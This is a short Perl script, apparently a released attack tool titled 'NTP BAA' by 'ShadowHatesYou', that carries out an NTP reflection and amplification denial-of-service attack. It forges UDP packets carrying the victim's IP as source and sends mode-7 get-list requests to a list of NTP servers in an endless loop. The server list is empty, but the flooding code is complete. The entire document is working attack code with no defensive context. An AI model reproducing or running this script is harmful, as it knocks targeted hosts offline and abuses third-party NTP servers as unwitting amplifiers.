#!/usr/bin/perl
# NTP BAA
# by ShadowHatesYou
use Net::RawIP;
@ntpservers = qw(

);
if ($ARGV[0] eq '') { print "Use: $0 <IP>\n"; exit; }
my $target = "$ARGV[0]";
my $ntp_getlist = "\x17\x00\x03\x2a\x00\x00\x00\x00";
my $ntp_getpeer = "\x17\x00\x03\x00\x00\x00\x00\x00";
my $sock =  new Net::RawIP({udp=>{}});
while () {
        for (my $i=0; $i < @ntpservers; $i++) {
                $sock->set({ip => {saddr => $target, daddr => $ntpservers[$i]},udp => {source => 123,dest => 123, data=>$ntp_getlist} });
                $sock->send;
        }
}

